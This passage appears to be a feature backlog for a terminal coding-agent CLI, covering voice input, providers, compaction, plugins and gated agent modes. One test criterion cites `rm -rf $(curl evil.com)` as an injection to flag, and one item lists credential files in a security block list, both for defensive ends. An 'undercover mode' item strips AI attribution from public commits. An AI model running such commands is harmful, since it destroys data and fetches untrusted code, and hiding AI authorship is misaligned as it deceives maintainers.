Falls back to SoX `rec` or ALSA `arecord` on Linux. Audio is recorded while the key is held, then transcribed. The native module is loaded lazily to avoid blocking startup.
items.done: Holding the voice keybinding records audio. On release, it transcribes and submits as a prompt. `/voice status` shows whether native audio or fallback is active.

items.title: Smart first-run example commands — git-history-aware prompt suggestions on empty input
items.summary: On first launch or empty-state input, CC generates contextual example commands by sampling from git history (recent commit messages, changed files) filtered through a pattern list that removes lock files, build artifacts, generated files, and config. Examples like 'Explain the changes in <recent-file>.ts' are shown as tappable suggestions instead of generic placeholder text.
items.done: Empty input shows 3-4 smart example commands drawn from the current repo's git history. They update per-project, not per-install.

items.title: Shell completion install — add `claude` tab-completion to bash/zsh/fish rc files
items.summary: CC generates and caches shell completion scripts for bash, zsh, and fish, then installs them into the user's shell rc file. Completions are cached to disk (per theme/shell) and only regenerated when the theme or version changes. Enables tab-completing `claude` subcommands and flags in the terminal.
items.done: `claude --install-completions` adds completion source to ~/.bashrc. Tab-completing `claude r` offers `run`, `resume`, `review`, etc.

items.title: Auto-run /issue — proactive GitHub issue creation with ESC cancellation window
items.summary: When CC detects conditions that warrant filing a GitHub issue (bug, unexpected behavior), it shows an `AutoRunIssueNotification` banner proposing to auto-run `/issue`. The user has a brief window to press ESC to cancel; otherwise the issue command runs automatically. The banner shows the reason for the proposed issue.
items.done: After a crash or repeated error, a banner appears: 'Running /issue: unexpected tool failure [ESC to cancel]'. On ESC timeout, `/issue` runs and opens a draft in the browser.

items.title: API preconnect — pre-warm TCP+TLS during startup for 100-200ms first-request savings
items.summary: CC fires a fire-and-forget fetch to the Anthropic API endpoint during init (after CA certs and proxy are configured), warming the TCP+TLS connection pool before the first real request. Bun's keep-alive pool reuses the connection. In `-p` mode this saves ~100-200ms; in interactive mode the savings are the full 'user is typing' window. Runs AFTER settings.json env vars are applied so proxy/mTLS settings are respected.
items.done: First API request in a session completes 100-200ms faster because the connection was pre-warmed during startup.

items.title: External prompt editor — open $EDITOR to compose multi-line input
items.summary: CC lets users press a keybinding to open the current prompt input in their external editor (`$VISUAL`, `$EDITOR`, or detected IDE). Supports VS Code (`code -w`), Sublime Text (`subl --wait`), and any GUI editor. Pasted content refs from the editor are expanded back into the prompt on save. Enables composing complex multi-line prompts outside the terminal.
items.done: Pressing the editor keybinding opens the current prompt draft in VS Code. Saving and closing inserts the edited text back into the input.

items.title: Grove — data privacy/consent opt-in dialog at onboarding and policy updates
items.summary: CC's 'Grove' is a data privacy consent dialog shown at onboarding, after policy updates, and in Settings. Users choose accept_opt_in (share data), accept_opt_out (don't share), or defer (decide later). CC tracks whether the notice has been viewed. Shows updated ASCII art on new terms. Distinct from /privacy-settings (subscription prefs) — this is the initial data-collection consent flow.
items.done: First launch shows the Grove dialog. User selects opt-in or opt-out. Decision is stored. /settings has a 'Data privacy' section to revisit it.

items.title: Streaming tool execution — start tools as tool_use blocks arrive in stream
items.summary: CC's StreamingToolExecutor begins executing tools as their `tool_use` blocks arrive in the streaming response, without waiting for the full response to complete. Concurrency-safe tools (Glob, Grep, Read, etc.) can start while the model is still generating. Queued tools wait for their slot. Reduces end-to-end latency for tool-heavy turns by overlapping execution with streaming.
items.done: A turn with 3 Glob calls starts executing the first Glob while the model is still streaming the 2nd and 3rd. Total wall-clock time drops proportionally.

items.title: Adaptive thinking mode — let model self-budget tokens + `ultrathink` max-budget keyword
items.summary: CC supports three thinking modes: `adaptive` (model decides how much thinking budget to use), `enabled` with a fixed `budgetTokens` value, and `disabled`. The `ultrathink` keyword in a prompt triggers maximum thinking budget (feature-gated). Users control mode via /think toggle or settings. Adaptive mode avoids token waste on simple tasks while allowing deep reasoning on complex ones.
items.done: `/think` cycles through disabled → adaptive → max. Typing 'ultrathink' in a prompt activates maximum extended thinking for that turn only.

items.title: Hook timing indicator — show elapsed time when hooks take >500ms
items.summary: CC shows a timing indicator in the hook progress display when a hook takes longer than `HOOK_TIMING_DISPLAY_THRESHOLD_MS` (500ms). Helps users identify slow hooks that are delaying tool execution, with elapsed time shown as e.g. '1.2s' in the hook progress pill.
items.done: A PreToolUse hook that takes 800ms shows '800ms' next to the hook name in the tool call progress display.

items.title: In-TUI agent editor — edit agent tools, color, model, and file from /agents menu
items.summary: CC's `/agents` menu has an in-TUI editor for custom agents: choose allowed tools via ToolSelector, assign a color via ColorPicker, change the model via ModelSelector, or open the agent's markdown file in the external editor. Saves changes to the agent file. Only editable for custom (non-built-in, non-plugin) agents.
items.done: `/agents` → select a custom agent → Edit → change tools/model/color or open in VS Code. Changes persist to `~/.claude/agents/<name>.md`.

items.title: AI agent generator — LLM-powered creation of agent definitions from description
items.summary: CC can generate a new agent definition (identifier, whenToUse, systemPrompt) by prompting a fast model with the user's description and repo context. The generated agent is written to `~/.claude/agents/<identifier>.md`. Triggered from the `/agents` new-agent flow. Integrates with auto-memory if enabled.
items.done: In `/agents`, choosing 'Create new agent' and typing a description generates a ready-to-use agent file with a system prompt tailored to the repo context.

items.title: Slack channel autocomplete — `#channel` mention suggestions in prompt input
items.summary: CC's prompt input suggestion overlay supports a `slack-channel` suggestion type, enabling `#channel-name` autocomplete when the user types `#` in the prompt. Integrates with the Slack channel suggestion service (`slackChannelSuggestions.ts`) to fetch accessible channels. Used in organizations with Slack integration enabled.
items.done: Typing `#eng` in the prompt shows matching Slack channels as suggestions. Selecting one inserts the channel reference for context or notification routing.

items.title: Model deprecation warnings — show retirement date when user is on a deprecated model
items.summary: CC tracks model deprecation info per provider with retirement dates. When the active model is deprecated, CC surfaces a warning with the model name, retirement date, and a suggestion to upgrade. Deprecation data is provider-aware (same model may have different retirement timelines on different providers).
items.done: When using a model past its retirement announcement date, a warning in the status line shows 'claude-3-opus-20240229 retires 2025-08-01 — /model to switch'.
items.notes: SHIPPED 2026-06-10 (parallel agent + parent integration). providers/model-deprecation.ts: pure modelDeprecationNotice(modelId, now) over a curated DEPRECATIONS map of clearly-legacy ids (claude-1/2/2.0/2.1/instant, gpt-4-0314/0613, gpt-3.5-turbo-0301/0613, gemini-1.0-pro/pro) → "model 'X' is deprecated (retires DATE) — switch to Y"; case-insensitive + prefix match (gpt-4-0314-preview matches). modelDeprecationNotices(env, now) reads VANTA_MODEL. Wired into status.ts notices: [...detectAuthConflicts, ...modelDeprecationNotices] → shown by vanta status/doctor under "⚠ notices:". Dates are best-effort/illustrative. +7 tests; full suite 1985 green, tsc clean.

items.title: Shell output JSON auto-format — pretty-print JSON lines in bash output
items.summary: CC's shell output renderer (`OutputLine`) attempts to parse each output line as JSON and re-serializes it for readability when successful. Checks for precision loss on large integers before substituting. Turns compact JSON API responses in bash output into human-readable formatted output without user action.
items.done: A bash command that outputs `{"status":"ok","count":42}` renders as nicely formatted JSON in the transcript instead of raw string.

items.title: Terminal hyperlinks — OSC 8 clickable links in tool output and messages
items.summary: CC creates OSC 8 terminal hyperlinks (`createHyperlink`) in shell output and messages. In supporting terminals (iTerm2, WezTerm, Kitty, modern terminals), URLs become clickable links that open in the browser. The feature is guarded by `supportsHyperlinks()` for terminals that don't support OSC 8.
items.done: File paths and URLs in bash output are rendered as clickable links in iTerm2/WezTerm. Clicking opens the file in the browser or editor.

items.title: Syntax highlighting — colored code blocks in CLI output via cli-highlight
items.summary: CC lazy-loads `cli-highlight` to syntax-highlight code blocks in CLI output and markdown rendering. `supportsLanguage()` checks before applying highlighting. The module is shared lazily across Fallback.tsx, markdown.ts, events.ts, and getLanguageName. Avoids adding startup overhead by loading only on first use.
items.done: Code blocks in assistant responses and tool output are syntax-highlighted in the terminal (e.g. TypeScript keywords colored, strings highlighted).

items.title: AWS Bedrock provider — full Bedrock deployment with inference profiles, STS, cross-region
items.summary: CC supports AWS Bedrock as a first-class provider (`CLAUDE_CODE_USE_BEDROCK=1`). Features: `getBedrockInferenceProfiles` lists available system-defined Anthropic profiles for cross-region routing, STS credentials management with `aws sts assume-role`, `CLAUDE_CODE_SKIP_BEDROCK_AUTH` for CI, `AwsAuthStatusManager` singleton for auth refresh status across React/SDK. Model names differ per provider (e.g. `us.anthropic.claude-3-7-sonnet-20250219-v1:0`).
items.done: `CLAUDE_CODE_USE_BEDROCK=1` routes all API calls through Bedrock. `/status` shows Bedrock as provider. Inference profiles are listed in `/model`.

items.title: Google Vertex AI provider — full Vertex deployment with GCP auth refresh
items.summary: CC supports Google Vertex AI as a first-class provider (`CLAUDE_CODE_USE_VERTEX=1`). Uses `AwsAuthStatusManager` (provider-agnostic despite legacy name) for GCP credential refresh status. Model names differ per provider (e.g. `claude-3-7-sonnet@20250219`). Model config constants (`CLAUDE_*_CONFIG`) include Vertex variants for each model.
items.done: `CLAUDE_CODE_USE_VERTEX=1` routes all API calls through Vertex. GCP credentials auto-refresh. `/status` shows Vertex as provider.

items.title: Undercover mode — safety strip for public/open-source repo contributions
items.summary: CC's 'undercover mode' activates when working in public/external repos (auto-detects unless repo is in internal allowlist, or `CLAUDE_CODE_UNDERCOVER=1`). When active: adds safety instructions to commit/PR prompts to avoid leaking internal codenames or Anthropic-internal context, and strips all commit attribution. The model is not told its own identity.
items.done: Working in a public GitHub repo, CC adds a safety caveat to generated commit messages and omits model attribution. `VANTA_UNDERCOVER=1` forces it on.

items.title: /stats sparkline charts — ASCII activity charts and heatmap in stats view
items.summary: CC's `/stats` view renders ASCII sparkline charts using `asciichart` for activity over time (sessions/day, tokens/session), plus a terminal heatmap (GitHub-style). Navigation with j/k/arrows. The stats are aggregated from transcript JSONL files across all sessions.
items.done: `/stats` shows an ASCII line chart of daily activity and a 12-week heatmap of session counts, navigable with arrow keys.

items.title: /env — set session-scoped environment variables for child processes
items.summary: CC has an `/env` command that sets session-scoped environment variables. These are stored in `sessionEnvVars` and applied only to spawned child processes (via the bash provider env overrides) — NOT to the REPL process itself. Useful for temporarily setting API keys, feature flags, or tool configuration without modifying shell profile.
items.done: `/env FOO=bar` sets FOO for subsequent bash tool calls in the session. `/env` with no args shows current session env vars. Vars are cleared on session end.

items.title: Privacy levels — default/no-telemetry/essential-traffic to control network traffic
items.summary: CC supports three privacy levels (ordered by restrictiveness): `default` (everything enabled), `no-telemetry` (disables analytics/telemetry but other network traffic allowed), and `essential-traffic` (only API calls — no telemetry, no update checks, no marketplace refreshes, no bootstrap). Configurable via settings or `CLAUDE_CODE_PRIVACY_LEVEL`.
items.done: `VANTA_PRIVACY=no-telemetry` disables all usage tracking. `essential-traffic` mode blocks all non-API network calls for air-gapped environments.

items.title: HTTPS proxy support — route API calls through corporate proxy
items.summary: CC supports standard `HTTPS_PROXY` / `HTTP_PROXY` env vars and an `ANTHROPIC_PROXY_URL` override for routing all API traffic through a corporate proxy. Uses `HttpsProxyAgent` with full proxy auth support. Also supports AWS SDK proxy config for Bedrock calls. The proxy agent is lazily loaded (~1.5MB undici) only when proxy vars are set.
items.done: Setting `HTTPS_PROXY=http://proxy.corp.com:8080` routes all Vanta API calls through the corporate proxy. No code changes needed.

items.title: Interleaved thinking — thinking tokens between tool calls, not just before response
items.summary: CC supports an `interleaved_thinking` capability mode where extended thinking tokens are interleaved between tool calls, not just in the initial response block. This allows the model to reason after each tool result before deciding the next action. Listed alongside `thinking`, `adaptive_thinking`, `effort`, and `max_effort` as a model capability override.
items.done: With interleaved thinking enabled, thinking blocks appear in the transcript after each tool result as the model reasons about next steps.

items.title: Model tier env overrides — pin opus/sonnet/haiku to specific model versions
items.summary: CC reads `ANTHROPIC_DEFAULT_OPUS_MODEL`, `ANTHROPIC_DEFAULT_SONNET_MODEL`, and `ANTHROPIC_DEFAULT_HAIKU_MODEL` env vars to pin each model tier to a specific version. Combined with `ANTHROPIC_DEFAULT_*_MODEL_SUPPORTED_CAPABILITIES` to declare what capabilities the override model supports. Useful for enterprise deployments pinning to a specific API version.
items.done: `ANTHROPIC_DEFAULT_SONNET_MODEL=claude-sonnet-4-6` pins the sonnet alias to that exact version. `/model` and startup banner reflect the override.

items.title: Skip update version — snooze a specific CLI update version permanently
items.summary: CC's auto-updater supports `shouldSkipVersion(targetVersion)` — if the user chooses 'Skip this version', the version is persisted to global config and the update prompt never reappears for that version. `MaxVersionConfig` from GrowthBook can also cap the maximum auto-update target. Pairs with release channels.
items.done: When prompted to update to vX.Y.Z, choosing 'Skip' persists the skip. Future launches don't prompt for vX.Y.Z, only for newer versions.

items.title: Prompt keyword detection — 'keep going' resumes, negative keywords stop agent
items.summary: CC detects semantic keywords in user prompts: `matchesKeepGoingKeyword()` detects 'continue', 'keep going', 'proceed' to signal the agent should resume without stopping; `matchesNegativeKeyword()` detects 'no', 'stop', 'cancel' to signal interruption. Used in multi-turn flows and agentic sessions to understand user intent without full LLM inference.
items.done: Typing 'keep going' after an agent pause resumes without generating a new full response. 'stop' or 'no' in a message flags the intent for the agent loop.
items.notes: SHIPPED 2026-06-10 (parallel agent + parent integration). repl/prompt-keywords.ts: pure classifyPromptKeyword(text) → "continue"|"stop"|null. Normalizes (trim, lowercase, strip one trailing .!?) then WHOLE-STRING set-matches so a bare phrase fires but an embedded one doesn't ("keep going" → continue; "keep going on the refactor" → null). continue set: keep going/continue/go on/proceed/keep at it/carry on; stop set: stop/never mind/nevermind/cancel that/forget it. CONTINUE_NUDGE exported. Wired into tui/app.tsx submit (after the busy-enqueue guard): a bare continue phrase sends the nudge to resume the prior task instead of the literal text. No auto-action for "stop" (Esc already interrupts). +7 tests; full suite 1985 green, tsc clean.

items.title: Auth conflict notice — warn when both API key and OAuth credentials are configured
items.summary: CC surfaces a startup status notice (`apiKeyConflictNotice`, `bothAuthMethodsNotice`) when both an API key and OAuth login are simultaneously active. These can conflict — the user may not realize they're using the wrong credentials. The notice suggests which to remove and links to auth docs.
items.done: After `claude login` while `ANTHROPIC_API_KEY` is also set, a startup notice says 'Both API key and OAuth configured — remove one to avoid conflicts'.
items.notes: SHIPPED 2026-06-10. providers/auth-conflict.ts: pure authConflictNotices(env, {claude,codex}) + detectAuthConflicts(env) (detects OAuth via CLAUDE_CODE_OAUTH_TOKEN/ANTHROPIC_AUTH_TOKEN env or ~/.claude/.credentials.json, and ~/.codex/auth.json). Flags ANTHROPIC_API_KEY+Claude-OAuth and OPENAI_API_KEY+Codex-OAuth coexistence with a 'remove one' notice naming which provider uses which. Surfaced in StatusReport.notices → rendered by `vanta status`/`doctor` under "⚠ notices:". Reused existing path helpers (exported credentialsPath from claude-code-auth.ts; defaultCodexAuthPath already exported). Whitespace-only keys treated as unset. +9 tests; suite green, tsc clean.

items.title: `claude plugin` CLI — install/uninstall/enable/disable/update plugins from terminal
items.summary: CC has a `claude plugin` subcommand with operations: `install <name@marketplace>`, `uninstall <name>`, `enable <name>`, `disable <name>`, `update [name]`. Pure library functions in `pluginOperations.ts` power both the CLI and the interactive ManagePlugins.tsx UI. Non-interactive mode (CI/scripts) supported.
items.done: `claude plugin install pylsp@agent-skills` installs and activates the LSP plugin. `claude plugin disable pylsp` disables it without removing. `claude plugin update` updates all.

items.title: Bridge QR code — scannable QR for mobile/remote connection to live session
items.summary: CC's bridge UI generates a QR code (`qrcode` library) displaying the bridge connection URL. Users can scan it to connect from a mobile device or another computer to the live session. Shows alongside BRIDGE_READY_INDICATOR and bridge spinner frames in the CLI.
items.done: When bridge is active, a QR code is rendered in the terminal. Scanning it on mobile opens the session in a browser or app.

items.title: Git-sourced remote sessions — create remote session from a git repository URL
items.summary: CC's remote session creation supports a `GitSource` type (`{type: 'git_repository', url, revision?}`) for spinning up a remote environment from a git repo URL directly. The session clones the repo and runs in it, rather than teleporting an existing local session. Used in the cloud/CCR flow.
items.done: Providing a GitHub repo URL to the remote session creator spawns a container with that repo checked out at the given revision.

items.title: Plan mode interview phase — clarifying questions before plan execution
items.summary: CC plan mode v2 has an 'interview phase' (`isPlanModeInterviewPhaseEnabled`, gate `tengu_plan_mode_interview_phase`) that runs before plan execution. CC asks clarifying questions to refine the plan scope, constraints, and approach before spawning sub-agents. Prevents wasted work from misunderstood requirements.
items.done: Entering plan mode shows a question phase: 'Before I plan this, I need to clarify: [questions]'. User answers, then CC generates the refined plan and executes it.

items.title: /compact with custom instructions — control what the summary preserves
items.summary: CC's `/compact` accepts an optional argument: `/compact <instructions>` to guide the summarization. E.g. `/compact focus on the authentication flow` tells the summarizer what to emphasize. Also supports `DISABLE_COMPACT` env var to block compaction. Works in non-interactive mode for scripted compaction.
items.done: `/compact keep the database schema details` produces a summary that preserves schema context over other content.
items.notes: SHIPPED 2026-06-10 (parallel agent + parent integration). /compress now accepts an optional instruction: session.ts buildSummarizer(provider, instructions?) prepends "Focus especially on: <instr>" to the summary system prompt (summarizeSys helper); all other callers unchanged via the optional param. handlers.ts compress handler threads arg.trim() → buildSummarizer. New repl/compact-gate.ts: compactionDisabled(env) (VANTA_DISABLE_COMPACT/DISABLE_COMPACT === "1") short-circuits the manual /compress with a "compaction disabled" notice (auto-compaction not gated — out of scope). +7 tests; full suite 2032 green, tsc clean.

items.title: Post-compact file restoration — re-inject top files and skills after compaction
items.summary: After CC compacts a conversation, it runs a post-compact restoration phase: up to 5 key files are re-read into context (budget: 50K tokens total, 5K per file), and active skills are re-injected (budget: 25K tokens). This prevents the agent from 'forgetting' critical files that were recently edited. `runPostCompactCleanup()` orchestrates this.
items.done: After /compact, the 5 most recently accessed files are automatically re-read into the fresh context. The agent doesn't lose track of the active codebase state.

items.title: API key helper script — dynamic API key via shell command or project settings
items.summary: CC supports `api_key_helper` — a shell command configured in settings or project config that is executed to dynamically retrieve an API key (e.g. from a vault, 1Password, or credential manager). `getApiKeyFromApiKeyHelperCached()` caches the result with a TTL. `prefetchApiKeyFromApiKeyHelperIfSafe()` warms the cache during startup. Also supports AWS credential export from project settings.
items.done: `api_key_helper: 'op read op://vault/anthropic/key'` in settings.json fetches the API key from 1Password at startup. Cached and refreshed automatically.

items.title: Shadowed permission rule detection — warn about unreachable allow/deny rules
items.summary: CC's `detectUnreachableRules()` analyzes the permission rule set and identifies rules that will never match because a broader rule with the same tool already shadows them. Surfaced as a `ContextWarning` in `/doctor`. Prevents confusion where users add rules that silently have no effect because an existing `Allow Bash(*)` already covers them.
items.done: `/doctor` reports 'Rule Allow Bash(ls) is unreachable — shadowed by Allow Bash(*)'. Helps users maintain a clean permission set.

items.title: Dangerous paths blocklist — hardcoded files/dirs Claude never writes to
items.summary: CC maintains `DANGEROUS_FILES` and `DANGEROUS_DIRECTORIES` constants — a hardcoded blocklist of system-critical paths (SSH keys, shell configs, credentials, OS directories) that Claude will never write to, regardless of permission rules. This is distinct from user-configured deny rules and cannot be overridden.
items.done: Attempting to edit `~/.ssh/id_rsa` or `/etc/passwd` always returns a permission denial, even in bypassPermissions mode.
items.notes: SHIPPED 2026-06-10. tools/writable-zones.ts: isDangerousPath(abs) — an unconditional floor beneath zones, scope AND approval mode. Blocks DANGEROUS_DIRS (~/.ssh ~/.gnupg ~/.aws ~/.config/gcloud /etc /private/etc /System /var/db/sudo) + DANGEROUS_FILES (~/.netrc ~/.npmrc ~/.pypirc ~/.docker/config.json ~/.kube/config ~/.codex/auth.json ~/.claude/.credentials.json ~/.vanta/google-tokens.json + shell rc files). Checked FIRST in both resolveReadablePath (reads) and a new resolveWritablePath (writes), so write_file/edit_file/read_file/describe_image/compare_vision all refuse these paths even in auto-approve mode. Also DRY'd write_file+edit_file onto resolveWritablePath (mirrors the read helper; the security floor now lives in one place per direction). Prefix-collision safe (~/.ssh-backup not blocked). +~15 tests; suite green, tsc clean.

items.title: Auto tool-search mode — defer tools only when they exceed the context threshold
items.summary: CC supports `ENABLE_TOOL_SEARCH=auto` (tst-auto mode): tools are only deferred to ToolSearch when their total schema size exceeds `getAutoToolSearchCharThreshold(model)`. Below the threshold, all tools are exposed inline as usual. `auto:50` enables for 50% of sessions for gradual rollout. Prevents unnecessary overhead for simple sessions while still protecting context on complex ones.
items.done: With `VANTA_TOOL_SEARCH=auto`, simple sessions see all tools inline. Sessions with many plugins/MCP tools automatically defer the overflow to ToolSearch.

items.title: Background session process manager — `claude ps/logs/attach/kill` + `--bg` flag
items.summary: CC (feature-gated `BG_SESSIONS`) supports `--bg`/`--background` to spawn a session as a background process, then manage it with: `claude ps` (list running sessions), `claude logs <id>` (stream output), `claude attach <id>` (bring to foreground), `claude kill <id>` (terminate). Similar to Docker/tmux session management but for CC agent sessions.
items.done: `claude run 'fix all lint errors' --bg` spawns in background. `claude ps` shows it running. `claude attach <id>` brings it foreground. `claude kill <id>` terminates it.

items.title: `--bare` mode — minimal output format for scripting and pipelines
items.summary: CC supports a `--bare` CLI flag that enables bare mode: minimal output formatting suitable for scripting and pipes. In bare mode, decorative UI elements (spinners, boxes, colors, status line) are stripped — only the essential response text is output. Complements `--print` / non-interactive mode.
items.done: `claude --bare 'summarize this file' < file.txt` outputs only the summary text, no terminal UI chrome. Suitable for shell pipelines.

items.title: Bun WebView — native embedded browser panel inside the terminal
items.summary: CC (feature-gated `WEB_BROWSER_TOOL`) supports a native embedded browser panel using Bun's built-in `WebView` API. Unlike Claude for Chrome (which uses a Chrome extension) or computer use (which takes screenshots), this embeds a real browser pane directly in the Bun runtime. Available only in native Bun builds with WebView support.
items.done: A side panel shows a live browser view within the terminal. The agent can interact with it via WebBrowserTool commands without needing a separate Chrome process.

items.title: UDS peer agents — `/peers` command and ListPeersTool for agent discovery via Unix sockets
items.summary: CC (feature-gated `UDS_INBOX`) supports peer agent discovery and communication via Unix Domain Sockets. `/peers` lists visible peer agents; `ListPeersTool` gives the agent programmatic access to discover and address peers. Distinct from swarm mailbox messaging (file-based) — UDS provides lower-latency IPC for agents running on the same machine.
items.done: `/peers` lists other CC sessions running on the machine. An agent can call `list_peers` and then `send_message` to an agent ID to collaborate across sessions.

items.title: Terminal panel + TerminalCaptureTool — agent captures terminal content, Meta+J toggle
items.summary: CC (feature-gated `TERMINAL_PANEL`) adds a `TerminalCaptureTool` letting the agent read the current terminal buffer content, plus an embedded terminal panel toggled with `Meta+J` (`app:toggleTerminal`). The agent can 'see' what's on screen without a screenshot.
items.done: `Meta+J` opens a terminal panel. The agent can call `terminal_capture` to read current terminal output as text context, useful for debugging TUI apps.

items.title: History snipping — automatic SDK conversation pruning for long-running sessions
items.summary: CC (feature-gated `HISTORY_SNIP`) automatically snips (prunes) conversation history in long SDK sessions to bound memory. Uses `snipCompact` to truncate and `snipProjection` to maintain a view. SDK-only — the interactive REPL keeps full history for scrollback. Distinct from manual /compact: triggered automatically by token count rather than user action.
items.done: In long SDK runs, conversation history is pruned to a rolling window automatically. `snipProjection` provides a projected view for the agent without the full context.

items.title: Mobile push notifications — alert when task completes or input needed
items.summary: CC supports mobile push notifications via `taskCompleteNotifEnabled` and `inputNeededNotifEnabled` config settings (requires Remote Control). When enabled, CC pushes to the user's mobile device when idle after task completion, or when the agent needs input. Configured in /config.
items.done: With Remote Control and `taskCompleteNotifEnabled: true`, a push notification arrives on phone when a long-running task finishes.

items.title: MCP skills — MCP servers can provide slash commands and skills
items.summary: CC (feature-gated `MCP_SKILLS`) allows MCP servers to provide skills/slash commands. `fetchMcpSkillsForClient` fetches skills from connected MCP servers and registers them alongside plugin-provided skills. Commands from MCP servers appear in the slash palette.
items.done: An MCP server that declares skills has those skills appear in `/skills`. Running `/skill-name` invokes the MCP server's skill handler.

items.title: Templates — prompt classification and template injection for common task patterns
items.summary: CC (feature-gated `TEMPLATES`) classifies prompts into job templates using a `jobClassifier` at query time. Templates are loaded from a `templates/` directory alongside agents/commands in plugin manifests. Enables pre-structured prompts for common workflows.
items.done: Prompts matching known patterns (e.g. 'fix bug', 'write test') are classified and augmented with template context before being sent to the model.

items.title: Quick search — keyboard-triggered search overlay without opening a modal
items.summary: CC (feature-gated `QUICK_SEARCH`) adds a quick search keybinding that activates a search overlay directly in the prompt input without requiring a modal. Distinct from the full transcript search dialog — designed for fast inline filtering.
items.done: A keybinding opens quick search in the input bar. Typing filters transcript/commands inline without opening a separate dialog.

items.title: Verification agent — built-in agent that auto-verifies task completion
items.summary: CC (feature-gated `VERIFICATION_AGENT`) registers a built-in verification agent that runs automatically after `TaskUpdate` tool calls that mark tasks complete. The verifier checks the work against the task description and flags discrepancies. Listed in `builtInAgents` and gated by subscription.
items.done: When an agent marks a TodoItem as 'completed', the verification agent runs and appends a pass/fail check to the transcript.

items.title: ReviewArtifactTool — review and approve generated code/file artifacts in UI
items.summary: CC (feature-gated `REVIEW_ARTIFACT`) has a `ReviewArtifactTool` with a dedicated `ReviewArtifactPermissionRequest` component. The tool presents a generated artifact (code file, document) for user review with approve/reject. Shows a diff-style view of the proposed artifact before it's written.
items.done: When the agent proposes a new file, a ReviewArtifact dialog shows the full content with an approve/reject choice before it's written to disk.

items.title: History picker — searchable input history overlay in the prompt bar
items.summary: CC (feature-gated `HISTORY_PICKER`) adds a searchable history picker in the prompt input. Unlike simple up-arrow cycling, the history picker shows a scrollable list of past prompts filtered by typing, triggered by a keybinding while the input is active.
items.done: A keybinding opens a searchable list of past prompts. Typing filters the list; Enter selects and inserts into the input.

items.title: MCP rich output — enhanced rendering for large MCP tool results
items.summary: CC (feature-gated `MCP_RICH_OUTPUT`) replaces plain text rendering of large MCP tool outputs with `MCPTextOutput` — a richer component with truncation handling and expand/collapse. For smaller outputs, falls back to `OutputLine`. Improves readability of verbose MCP responses.
items.done: Large MCP tool results are truncated with an expand button. The output renders with proper line wrapping and JSON formatting.

items.title: Reactive compact — proactive compaction triggered by context analysis warnings
items.summary: CC (feature-gated `REACTIVE_COMPACT`) adds reactive compaction: when `analyzeContext` detects that specific context categories (tool results, file reads) are consuming disproportionate tokens, it triggers compaction proactively before the context window fills. Distinct from auto-compact (threshold-based) and microcompact (cache-based).
items.done: When a large tool result is detected consuming >40% of context, reactive compact runs automatically to trim it before the agent's next turn.

items.title: Tree-sitter bash parser — AST-accurate security validation for bash commands
items.summary: CC (feature-gated `TREE_SITTER_BASH`) uses a tree-sitter-based AST parser for bash commands alongside (or replacing) the regex parser. Provides structurally accurate analysis of compound commands, pipelines, subshells — catching injection patterns that regex misses. `TREE_SITTER_BASH_SHADOW` runs both and compares for gradual rollout.
items.done: With tree-sitter bash enabled, `rm -rf $(curl evil.com)` is correctly parsed as a command substitution and flagged. Regex shadow mode logs discrepancies.

items.title: Prompt cache break detection — detect invalidation, trigger microcompact cleanup
items.summary: CC (feature-gated `PROMPT_CACHE_BREAK_DETECTION`) detects when the Anthropic API prompt cache is invalidated (cache miss after a hit sequence). On detection, triggers cleanup: subagents are notified via `notifyCompaction`, and /compact can respond reactively. Prevents unnecessary re-billing from repeated cache misses. Feature flag: `BREAK_CACHE_COMMAND`.
items.done: When the cache breaks mid-session, a microcompact runs to shrink the prompt before the next request, avoiding a large uncached prefix resend.

items.title: Native clipboard image — capture images without external tools (xclip/pbpaste)
items.summary: CC (feature-gated `NATIVE_CLIPBOARD_IMAGE`) uses native OS clipboard APIs for image capture instead of shelling out to `xclip`/`xsel` (Linux) or `pbpaste` (macOS). Faster, works in environments where clipboard tools aren't installed, and avoids subprocess overhead.
items.done: Pasting an image from clipboard works on Linux even without xclip installed. `/paste` and auto-detect both use the native API path.

items.title: `/init` command — generate a CLAUDE.md project context file
items.summary: CC has an `/init` command that analyzes the current project and generates a `CLAUDE.md` file with discovered context: tech stack, key files, coding conventions, and setup instructions. `NEW_INIT` is an improved variant that generates richer context. The file primes future Claude sessions on this project.
items.done: Running `/init` in a new project generates `.claude/CLAUDE.md` with detected stack, file structure, and conventions. Future sessions load this automatically.

items.title: KAIROS assistant mode — claude.ai-integrated assistant with brief/proactive/channels
items.summary: CC (feature-gated `KAIROS`) adds a full assistant integration layer: `assistant` command, `--brief` flag enabling SendUserMessage tool, `--proactive` mode (periodic tick-driven autonomy), `assistant` session entrypoint with `PendingAssistantChat` state, and gate-checked entitlement check. KAIROS is the umbrella for the claude.ai in-app Claude Code experience.
items.done: Running `claude assistant` or using `--brief` flag enables the KAIROS assistant mode. Brief tool sends structured updates to the user during long tasks.

items.title: KAIROS channels — MCP push notification channel subscriptions via --channels flag
items.summary: CC (feature-gated `KAIROS` or `KAIROS_CHANNELS`) adds `--channels <servers...>` CLI option that registers MCP servers whose channel notifications can push inbound messages into the session. `--dangerously-load-development-channels` allows unallowlisted servers for local dev. Used by AskUserQuestionTool and ExitPlanMode to skip user prompts when channels are active.
items.done: Launching CC with `--channels myserver` allows that MCP server to push messages into the active session. AskUserQuestion delivers the prompt via the channel instead of blocking.

items.title: GitHub PR webhook subscription — subscribe-pr command + SubscribePRTool
items.summary: CC (feature-gated `KAIROS_GITHUB_WEBHOOKS`) adds a `subscribe-pr` command and `SubscribePRTool` that subscribe to GitHub PR events via webhooks. The agent can watch PR activity (comments, reviews, CI status) and react proactively without polling.
items.done: Running `claude subscribe-pr` on a branch registers a webhook. When CI fails or a review is posted, the agent receives an inbound event and can act on it.

items.title: Computer use via MCP (CHICAGO) — route computer-use tool calls through MCP server
items.summary: CC (feature-gated `CHICAGO_MCP`) enables computer use tool calls to be handled by a dedicated MCP server (codename CHICAGO) rather than natively. Checks `isComputerUseMCPServer`, runs `cleanupComputerUseAfterTurn` after each turn, and sets up the COMPUTER_USE_MCP_SERVER_NAME. Enables GUI automation via the MCP protocol.
items.done: With `CHICAGO_MCP` and a computer-use MCP server configured, CC routes screenshot/click/type tool calls to the MCP server. macOS-specific setup runs at startup.

items.title: CCR mirror mode — outbound-only session mirroring to claude.ai
items.summary: CC (feature-gated `CCR_MIRROR`) adds an outbound-only CCR mode that mirrors the local session to claude.ai without accepting inbound commands. Controlled by `CLAUDE_CODE_CCR_MIRROR` env or GrowthBook `tengu_ccr_mirror` flag. Distinct from full bidirectional CCR — useful for passive session observation.
items.done: With CCR mirror enabled, the session streams output to claude.ai but the remote cannot send commands. A `tengu_ccr_mirror_started` event is logged.

